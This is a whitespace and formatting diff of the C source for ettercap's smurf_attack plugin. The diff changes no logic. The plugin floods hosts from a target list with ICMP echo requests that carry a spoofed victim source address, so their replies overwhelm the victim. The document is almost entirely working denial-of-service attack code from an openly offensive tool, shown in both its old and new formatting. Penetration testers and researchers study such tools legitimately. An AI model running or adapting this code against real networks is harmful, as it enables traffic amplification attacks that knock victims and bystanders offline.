@@ -21,12 +21,12 @@ static EC_THREAD_FUNC(smurfer);
 /* globals */
 
 struct plugin_ops smurf_attack_ops = {
-   .ettercap_version =     EC_VERSION,
-   .name =                 "smurf_attack",
-   .info =                 "Run a smurf attack against specified hosts",
-   .version =              "1.0",
-   .init =                 &smurf_attack_init,
-   .fini =                 &smurf_attack_fini,
+   .ettercap_version = EC_VERSION,
+   .name = "smurf_attack",
+   .info = "Run a smurf attack against specified hosts",
+   .version = "1.0",
+   .init = &smurf_attack_init,
+   .fini = &smurf_attack_fini,
 };
 
 /* teh c0d3 */
@@ -41,21 +41,21 @@ static int smurf_attack_init(void *dummy)
    struct ip_list *i;
 
    /* variable not used */
-   (void) dummy;
+   (void)dummy;
 
    DEBUG_MSG("smurf_attack_init");
 
-   if(GBL_OPTIONS->unoffensive) {
+   if (GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("smurf_attack: plugin doesnt work in unoffensive mode\n");
       return PLUGIN_FINISHED;
    }
 
-   if(GBL_TARGET1->all_ip && GBL_TARGET1->all_ip6) {
+   if (GBL_TARGET1->all_ip && GBL_TARGET1->all_ip6) {
       USER_MSG("Add at least one host to target one list.\n");
       return PLUGIN_FINISHED;
    }
 
-   if(GBL_TARGET2->all_ip && GBL_TARGET2->all_ip6 && LIST_EMPTY(&GBL_HOSTLIST)) {
+   if (GBL_TARGET2->all_ip && GBL_TARGET2->all_ip6 && LIST_EMPTY(&GBL_HOSTLIST)) {
       USER_MSG("Target two and global hostlist are empty.\n");
       return PLUGIN_FINISHED;
    }
@@ -81,11 +81,11 @@ static int smurf_attack_fini(void *dummy)
    pthread_t pid;
 
    /* variable not used */
-   (void) dummy;
+   (void)dummy;
 
    DEBUG_MSG("smurf_attack_fini");
 
-   while(!pthread_equal(EC_PTHREAD_NULL, pid = ec_thread_getpid("smurfer"))) {
+   while (!pthread_equal(EC_PTHREAD_NULL, pid = ec_thread_getpid("smurfer"))) {
       ec_thread_destroy(pid);
    }
 
@@ -97,10 +97,10 @@ static EC_THREAD_FUNC(smurfer)
    struct ip_addr *ip;
    struct ip_list *i, *itmp;
    struct hosts_list *h, *htmp;
-   LIST_HEAD(ip_list_t, ip_list) *ips = NULL;
+   LIST_HEAD(ip_list_t, ip_list) * ips = NULL;
 
    u_int16 proto;
-   int (*icmp_send)(struct ip_addr*, struct ip_addr*);
+   int (*icmp_send)(struct ip_addr *, struct ip_addr *);
 
    DEBUG_MSG("smurfer");
 
@@ -109,42 +109,41 @@ static EC_THREAD_FUNC(smurfer)
    proto = ntohs(ip->addr_type);
 
    /* some pointer magic here. nothing difficult */
-   switch(proto) {
-      case AF_INET:
-         icmp_send = send_L3_icmp_echo;
-         ips = (struct ip_list_t *)&GBL_TARGET2->ips;
-         break;
+   switch (proto) {
+   case AF_INET:
+      icmp_send = send_L3_icmp_echo;
+      ips = (struct ip_list_t *)&GBL_TARGET2->ips;
+      break;
 #ifdef WITH_IPV6
-      case AF_INET6:
-         icmp_send = send_L3_icmp6_echo;
-         ips = (struct ip_list_t *)&GBL_TARGET2->ip6;
-         break;
+   case AF_INET6:
+      icmp_send = send_L3_icmp6_echo;
+      ips = (struct ip_list_t *)&GBL_TARGET2->ip6;
+      break;
 #endif
-      default:
+   default:
       /* This won't ever be reached
        * if no other network layer protocol
        * is added.
        */
-         ec_thread_destroy(EC_PTHREAD_SELF);
-         break;
+      ec_thread_destroy(EC_PTHREAD_SELF);
+      break;
    }
 
    LOOP {
       CANCELLATION_POINT();
 
       /* if target two list is not empty using it */
-      if(!LIST_EMPTY(ips))
+      if (!LIST_EMPTY(ips))
          LIST_FOREACH_SAFE(i, ips, next, itmp)
-            icmp_send(ip, &i->ip);
+         icmp_send(ip, &i->ip);
       /* else using global hostlist */
       else
          LIST_FOREACH_SAFE(h, &GBL_HOSTLIST, next, htmp)
-            if(ntohs(h->ip.addr_type) == proto)
-               icmp_send(ip, &h->ip);
+         if (ntohs(h->ip.addr_type) == proto)
+            icmp_send(ip, &h->ip);
 
-      ec_usleep(1000*1000/GBL_CONF->sampling_rate);
+      ec_usleep(1000 * 1000 / GBL_CONF->sampling_rate);
    }
 
    return NULL;
 }
-
